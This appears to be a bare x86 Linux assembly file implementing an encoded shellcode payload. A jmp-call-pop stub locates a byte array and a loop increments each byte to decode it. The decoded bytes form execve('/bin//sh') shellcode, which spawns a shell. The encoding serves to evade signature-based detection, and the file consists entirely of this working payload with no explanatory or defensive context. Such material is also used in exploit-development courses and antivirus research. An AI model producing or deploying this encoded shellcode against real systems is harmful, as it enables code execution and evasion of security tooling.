

global _start			

section .text
_start:

	jmp short call_shellcode

decoder:
	pop esi
	xor ecx, ecx
	mov cl, 25
decode: 
	inc byte [esi]
	inc esi
	loop decode

	jmp EncodedShellcode
	



call_shellcode:

	call decoder
	EncodedShellcode: db 0x30,0xbf,0x4f,0x67,0x2e,0x2e,0x72,0x67,0x67,0x2e,0x61,0x68,0x6d,0x88,0xe2,0x4f,0x88,0xe1,0x52,0x88,0xe0,0xaf,0x0a,0xcc,0x7f,







